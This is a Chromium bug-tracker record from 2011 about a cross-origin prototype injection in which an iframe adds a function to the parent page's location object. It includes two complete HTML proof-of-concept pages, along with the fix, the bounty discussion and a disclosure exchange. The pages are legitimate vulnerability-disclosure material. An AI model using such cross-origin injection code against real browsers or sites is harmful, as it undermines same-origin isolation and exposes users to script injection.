# XSS injection via prototype chain

| Field | Value |
|-------|-------|
| **Issue ID** | [40092151](https://issues.chromium.org/issues/40092151) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | sh...@gmail.com |
| **Assignee** | ab...@chromium.org |
| **Created** | 2011-06-24 |
| **Bounty** | $500.00 |

## Description

Chrome Version : 12.0.742.100  

**URLs (if applicable) :**  

**Other browsers tested:**  

**Add OK or FAIL after other browsers where you have tested this issue:**  

**Safari 5:**  

**Firefox 4.x:**  

**IE 7/8/9:**

cross-domain iframe able to inject arbitrary function in window.location prototype,  

and call by main page.

**What steps will reproduce the problem?**

1. Make a page in <http://a.com/index01.html>

<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<title></title>
<script type="text/javascript">

function onLoad() {  

console.log("'fun' in location: ", "fun" in window.location);  

console.log("'fun' in document: ", "fun" in document);  

if ("fun" in window.location)  

console.log(window.location.fun());  

}

</script>
</head>
<body onLoad="onLoad();">
<iframe width="100" height="100"
src="http://b.com/index02.html">
</iframe>
</body>
</html>

2. Make another page in <http://b.com/index02.html>  
   
   Which inject

<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<script type="text/javascript">

// Make sure touch top window location first, get the hook to inject function.  

window.top.location;

//\*/ Inject cross domain function via Object.prototype  

Object.prototype.fun = function() {  

return("from iframe : " + window.location);  

};  

//\*/

/\*/ Inject cross domain function via location.**proto**  

window.location.**proto**.fun = function() {  

return("from iframe : " + window.location);  

};  

//\*/  

</script>

</head>
<body></body>
</html>

3. Browse <http://a.com/index01.html>

**What is the expected result?**

Console log  

'fun' in location: true  

index01.html:10'fun' in document: false  

index01.html:12from iframe : <http://b.com/index02.html>

**What happens instead?**

Console log  

'fun' in location: false  

index01.html:10'fun' in document: false

**Please provide any additional information below. Attach a screenshot if**  

**possible.**

## Timeline

### sh...@gmail.com (2011-06-24)

Sorry paste wrong result

expected result should be:

Console log
'fun' in location:  false
index01.html:10'fun' in document:  false


What happens instead should be:

Console log
'fun' in location:  true
index01.html:10'fun' in document:  false
index01.html:12from iframe : http://b.com/index02.html

### st...@chromium.org (2011-06-24)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-06-24)

Putting up the flags (verification and triage still needed).

### sc...@gmail.com (2011-06-24)

(Adam, any interest?)

Online repro: https://cevans-secure.appspot.com/static/framefunc.html
(Modified to use alert() if there is a problem, silent if not).
Fires on Chrome trunk, 13 beta.
We tested Safari, and it didn't fire so it could be a V8-bindings specific issue.

@shih.weilung: Can this be used to:
- _override_ existing functions in the parent frame?
- Inject a function the other way around? e.g. the parent frame injects into the child frame?
If so, the severity could be higher but I'm going with Medium for now.

### js...@chromium.org (2011-06-24)

[Empty comment from Monorail migration]

### ab...@chromium.org (2011-06-25)

Sigh.  JavaScriptCore used to have the same bug.  I though we'd fixed all of these.

### sc...@gmail.com (2011-06-25)

[Empty comment from Monorail migration]

### ab...@chromium.org (2011-06-26)

https://bugs.webkit.org/show_bug.cgi?id=63411

I'm working up a patch for this issue.  Details in the WebKit bug.

@shih.weilung: If you create an account on bugs.webkit.org, I'll CC you on the WebKit bug (which is where the patch and any associated discussion will take place).

### ab...@chromium.org (2011-06-26)

Patch posted upstream for review.

### sh...@gmail.com (2011-06-27)

Thanks, I created an account with same email address on the WebKit bug.

### ab...@chromium.org (2011-06-27)

Done.

### sc...@gmail.com (2011-06-27)

Thanks Adam!

Committed r89782: <http://trac.webkit.org/changeset/89782>

### sc...@gmail.com (2011-06-28)

Merged to M13: http://trac.webkit.org/changeset/89892

### ma...@google.com (2011-06-28)

Apologies for the spam, but this is an update to test changes to security@chromium.org.  Unfortunately, the test requires that I send email :(

### sc...@gmail.com (2011-07-19)

@shih.weilung: how would you like to be credited in our release notes?

### sh...@gmail.com (2011-07-19)

Thanks!
Please take a look at https://crbug.com/chromium/76748, looks like same root cause.
http://code.google.com/p/chromium/issues/detail?id=76748


### sc...@gmail.com (2011-07-19)

Should we use the name "Shih Weilung", written just like that?

### sh...@gmail.com (2011-07-19)

Yes, "Shih Weilung".

### sc...@gmail.com (2011-07-20)

@shih.weilung: congrats! Although "medium" severity, this bug is sufficiently interesting to attract a $500 Chromium Security Reward. Good find!

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sh...@gmail.com (2011-07-20)

Sigh, already disclosed publicly.

### sc...@gmail.com (2011-07-20)

Do you have a link for the public disclosure so that we can take a look?

### sh...@gmail.com (2011-07-20)

http://ticore.blogspot.com/2011/06/js-cross-domain-inject-issue.html

### sc...@gmail.com (2011-07-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-07-22)

@shih.weilung: we would still like to offer you the reward, despite the misunderstanding. To get any future rewards, all we ask is a chance to push the bugfix to stable users before it is publicly disclosed.

Thanks again for finding an interesting bug!

### sh...@gmail.com (2011-07-23)

Thanks!
I'll keep that in mind.

### sh...@gmail.com (2011-07-24)

@scarybeasts

One more thing, my name in passport is "Shih, Wei-Long".
Sorry for any inconvenience.

### js...@chromium.org (2011-10-05)

Batch update.

### sc...@gmail.com (2011-10-28)

@shih.weilung: please e-mail cevans@chromium.org to collect the reward.

### sc...@gmail.com (2011-11-23)

Payment in system.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/87339?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092151)*
